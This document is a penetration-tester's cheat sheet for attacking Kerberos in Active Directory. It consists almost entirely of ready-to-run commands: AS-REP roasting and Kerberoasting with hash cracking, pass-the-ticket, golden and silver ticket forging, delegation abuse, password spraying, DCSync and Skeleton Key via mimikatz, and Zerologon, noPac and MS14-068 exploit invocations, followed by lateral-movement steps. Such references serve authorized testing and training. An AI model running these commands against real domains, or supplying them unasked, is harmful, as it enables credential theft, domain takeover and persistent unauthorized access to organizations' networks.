# KERBEROS ENUMERATION & ATTACKS (Port 88)

## PORT OVERVIEW
```
Port 88 - Kerberos (KDC - Key Distribution Center)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p88 <IP>                              # Service/Version detection
nmap -p88 --script krb5-enum-users <IP>         # Enumerate users
nc -nv <IP> 88                                  # Manual connection attempt
```

## USER ENUMERATION
```bash
# kerbrute (fast user enumeration)
kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt  # Enumerate valid users
kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/Names/names.txt

# Nmap Kerberos enumeration
nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm="<DOMAIN>" <IP>

# Manual user enumeration via Kerberos
for user in $(cat users.txt); do echo "Testing: $user"; \
  echo | timeout 1 nc <DC_IP> 88 2>&1 | grep -i "response"; done
```

## AS-REP ROASTING (NO PRE-AUTH REQUIRED)
```bash
# Enumerate users without Kerberos pre-authentication
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass  # No password needed
impacket-GetNPUsers <DOMAIN>/<USER> -dc-ip <DC_IP> -no-pass  # Single user

# With credentials (find users with UF_DONT_REQUIRE_PREAUTH)
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt   # Crack with hashcat
john --wordlist=rockyou.txt asrep_hashes.txt    # Crack with john

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## KERBEROASTING (REQUEST SERVICE TICKETS)
```bash
# Request service tickets for accounts with SPNs
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request-user <TARGET_USER>  # Specific user

# With hash (pass-the-hash)
impacket-GetUserSPNs <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 kerberoast.txt rockyou.txt     # TGS-REP (RC4)
hashcat -m 19600 kerberoast.txt rockyou.txt     # TGS-REP (AES128)
hashcat -m 19700 kerberoast.txt rockyou.txt     # TGS-REP (AES256)
john --wordlist=rockyou.txt kerberoast.txt      # John the Ripper

# Rubeus (Windows)
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
Rubeus.exe kerberoast /user:sqlservice /format:hashcat  # Specific user
```

## TICKET REQUESTS
```bash
# Request TGT (Ticket Granting Ticket)
impacket-getTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>  # With hash

# Request ST (Service Ticket)
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn <SPN> -dc-ip <DC_IP>
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn cifs/<TARGET> -dc-ip <DC_IP>  # CIFS service

# Use ticket (kinit)
export KRB5CCNAME=<USER>.ccache                 # Set ticket location
kinit <USER>@<DOMAIN>                           # Request TGT
klist                                           # List cached tickets
kdestroy                                        # Destroy tickets
```

## PASS-THE-TICKET (PTT)
```bash
# Export ticket from Windows
mimikatz.exe "sekurlsa::tickets /export"        # Export all tickets

# Convert ticket format (Windows .kirbi to Linux .ccache)
impacket-ticketConverter ticket.kirbi ticket.ccache

# Use ticket on Linux
export KRB5CCNAME=ticket.ccache                 # Set ticket
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>  # Use ticket to authenticate

# Rubeus (Windows)
Rubeus.exe dump /luid:<LUID> /nowrap            # Dump ticket
Rubeus.exe ptt /ticket:<BASE64_TICKET>          # Pass-the-ticket
```

## OVERPASS-THE-HASH (PTH TO PTT)
```bash
# Use NTLM hash to request Kerberos ticket
impacket-getTGT <DOMAIN>/<USER> -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>

# Rubeus (Windows)
Rubeus.exe asktgt /user:<USER> /rc4:<NTLM_HASH> /ptt  # Request TGT and inject
```

## GOLDEN TICKET ATTACK
```bash
# Requirements: krbtgt NTLM hash, Domain SID
# Extract krbtgt hash (requires DC compromise)
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt

# Get Domain SID
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> | grep "Domain SID"

# Create Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USER>

# Use Golden Ticket
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<DC>
```

## SILVER TICKET ATTACK
```bash
# Requirements: Service account NTLM hash, Domain SID, SPN
# Create Silver Ticket (for specific service)
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SPN> <USER>

# Example: CIFS service
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -spn cifs/<TARGET> <USER>

# Use Silver Ticket
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>
```

## KERBEROS DELEGATION ATTACKS
```bash
# Unconstrained Delegation
# Find computers with unconstrained delegation
crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> --trusted-for-delegation

# Constrained Delegation
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn <SPN> -impersonate Administrator -dc-ip <DC_IP>

# Resource-Based Constrained Delegation (RBCD)
# Add msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd <DOMAIN>/<USER>:<PASSWORD> -delegate-from <COMPUTER$> -delegate-to <TARGET$> -dc-ip <DC_IP> -action write
```

## SPN ENUMERATION
```bash
# Find accounts with SPNs (Service Principal Names)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>  # List all SPNs
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request  # Request tickets

# With LDAP
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" \
  -b "dc=<DOMAIN>,dc=<TLD>" "servicePrincipalName=*" servicePrincipalName

# PowerView (Windows)
Get-DomainUser -SPN                             # Find users with SPNs
Get-DomainComputer -SPN                         # Find computers with SPNs
```

## KERBEROS BRUTE FORCE
```bash
# kerbrute password spray
kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> passwords.txt <USER>
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt <PASSWORD>

# Hydra
hydra -L users.txt -P passwords.txt <DC_IP> kerberos

# CrackMapExec
crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --kerberos
```

## KERBEROS CONFIGURATIONS
```bash
# Configure Kerberos client (Linux)
cat > /etc/krb5.conf <<EOF
[libdefaults]
    default_realm = <DOMAIN.COM>
    dns_lookup_kdc = true
    dns_lookup_realm = false

[realms]
    <DOMAIN.COM> = {
        kdc = <DC_IP>
        admin_server = <DC_IP>
    }

[domain_realm]
    .<domain.com> = <DOMAIN.COM>
    <domain.com> = <DOMAIN.COM>
EOF

# Test Kerberos authentication
kinit <USER>@<DOMAIN.COM>                       # Request TGT
klist                                           # List tickets
klist -e                                        # Show encryption types
```

## IMPACKET KERBEROS TOOLS
```bash
# GetNPUsers.py (AS-REP Roasting)
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request

# GetUserSPNs.py (Kerberoasting)
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request

# getTGT.py (Request TGT)
impacket-getTGT <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>

# getST.py (Request Service Ticket)
impacket-getST <DOMAIN>/<USER>:<PASSWORD> -spn <SPN> -dc-ip <DC_IP>

# ticketer.py (Create Golden/Silver Ticket)
impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> <USER>

# ticketConverter.py (Convert ticket formats)
impacket-ticketConverter ticket.kirbi ticket.ccache
```

## RUBEUS (WINDOWS TOOL)
```bash
# Rubeus commands (run on Windows)
Rubeus.exe asreproast /format:hashcat           # AS-REP roasting
Rubeus.exe kerberoast /format:hashcat           # Kerberoasting
Rubeus.exe dump                                 # Dump tickets
Rubeus.exe ptt /ticket:<BASE64>                 # Pass-the-ticket
Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /ptt # Request TGT with hash
Rubeus.exe asktgs /ticket:<TGT> /service:<SPN> /ptt  # Request service ticket
Rubeus.exe renew /ticket:<BASE64>               # Renew ticket
Rubeus.exe s4u /ticket:<TGT> /impersonateuser:<USER> /msdsspn:<SPN> /ptt  # S4U attack
Rubeus.exe monitor /interval:5                  # Monitor for new tickets
Rubeus.exe tgtdeleg                             # Request delegated TGT
```

## KERBEROS ENUMERATION VIA LDAP
```bash
# Find users with "Do not require Kerberos preauthentication"
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" \
  -b "dc=<DOMAIN>,dc=<TLD>" "userAccountControl:1.2.840.113556.1.4.803:=4194304" sAMAccountName

# Find users with SPNs
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" \
  -b "dc=<DOMAIN>,dc=<TLD>" "servicePrincipalName=*" sAMAccountName servicePrincipalName

# Find computers with unconstrained delegation
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" \
  -b "dc=<DOMAIN>,dc=<TLD>" "userAccountControl:1.2.840.113556.1.4.803:=524288" sAMAccountName
```

## KERBEROS VULNERABILITIES
```bash
# CVE-2020-1472 (Zerologon)
# Allows password reset of DC machine account
python3 zerologon_tester.py <DC_NAME> <DC_IP>   # Test for vulnerability

# CVE-2021-42287 & CVE-2021-42278 (noPac)
# Privilege escalation via machine account manipulation
python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -dc-host <DC_NAME>

# CVE-2022-33679 (Bronze Bit)
# Bypass Kerberos delegation restrictions
# Requires forged ticket with forwardable flag

# MS14-068 (Kerberos Privilege Escalation)
# Generate forged PAC with elevated privileges
python ms14-068.py -u <USER>@<DOMAIN> -s <USER_SID> -d <DC_IP>
```

## KERBEROS DOUBLE HOP PROBLEM
```bash
# Problem: Credentials not delegated in second hop
# Solutions:

# 1. CredSSP (Enable credential delegation)
# On Windows: Enable-WSManCredSSP -Role Client -DelegateComputer *

# 2. Resource-Based Constrained Delegation (RBCD)
# Configure delegation on target resource

# 3. Pass-the-Ticket
# Manually request and inject tickets for each hop
```

## KERBEROS ENCRYPTION TYPES
```bash
# Supported encryption types:
# - DES (deprecated, weak)
# - RC4-HMAC (older, commonly used)
# - AES128-CTS-HMAC-SHA1-96 (modern, strong)
# - AES256-CTS-HMAC-SHA1-96 (modern, strongest)

# Check supported encryption types
nmap -p88 --script krb5-enum-users <DC_IP>

# Request ticket with specific encryption
kinit -e aes256-cts-hmac-sha1-96 <USER>@<DOMAIN>

# Downgrade to RC4 (easier to crack)
# Edit /etc/krb5.conf to only allow RC4
```

## RID CYCLING (VIA KERBEROS)
```bash
# Enumerate users via RID cycling
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --rid-brute

# Impacket lookupsid
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> | grep "SidTypeUser"  # Only users
```

## COMMON MISCONFIGURATIONS
```
☐ Users with "Do not require Kerberos preauthentication" (AS-REP roasting)
☐ Service accounts with weak passwords (Kerberoasting)
☐ Unconstrained delegation enabled on computers
☐ Constrained delegation misconfigured
☐ RC4 encryption allowed (easier to crack)
☐ Weak krbtgt password (enables Golden Ticket)
☐ Service accounts with admin privileges
☐ No ticket lifetime restrictions
☐ Kerberos pre-authentication disabled globally
```

## QUICK WIN CHECKLIST
```
☐ Enumerate valid users (kerbrute)
☐ AS-REP roasting (users without pre-auth)
☐ Kerberoasting (request service tickets)
☐ Check for delegation (unconstrained/constrained)
☐ Password spray valid users
☐ Check for CVE-2020-1472 (Zerologon)
☐ Check for CVE-2021-42287/42278 (noPac)
☐ Enumerate SPNs
☐ Attempt ticket requests with found credentials
☐ Check for weak encryption types (RC4)
☐ RID cycling for user enumeration
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick Kerberos enumeration
nmap -sV -p88 --script krb5-enum-users --script-args krb5-enum-users.realm="<DOMAIN>" <DC_IP> && \
kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/Names/names.txt

# AS-REP roasting + Kerberoasting (if creds available)
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt && \
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

## ADVANCED TECHNIQUES
```bash
# Skeleton Key Attack (requires DC compromise)
# Injects master password into LSASS on DC
mimikatz.exe "privilege::debug" "misc::skeleton"

# DCSync Attack (extract credentials from DC)
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc

# DCShadow (inject objects into AD)
# Requires high privileges
mimikatz.exe "lsadump::dcshadow /object:CN=<USER>,OU=Users,DC=domain,DC=com /attribute:sidHistory /value:<SID>"

# Kerberos Armoring (FAST - Flexible Authentication Secure Tunneling)
# Protects against offline password attacks
```

## POST-EXPLOITATION (WITH KERBEROS ACCESS)
```bash
# After obtaining TGT/ST:
1. Use ticket to access services (SMB, WinRM, LDAP)
2. Request additional service tickets
3. Enumerate domain (users, groups, computers)
4. Lateral movement to other systems
5. Privilege escalation (delegation attacks)
6. Persistence (Golden Ticket, Skeleton Key)
7. DCSync to dump all domain credentials

# Access services with ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET>  # SMB/PsExec
impacket-wmiexec -k -no-pass <DOMAIN>/<USER>@<TARGET>  # WMI
impacket-smbexec -k -no-pass <DOMAIN>/<USER>@<TARGET>  # SMB
evil-winrm -i <TARGET> -r <DOMAIN>                     # WinRM with Kerberos
```
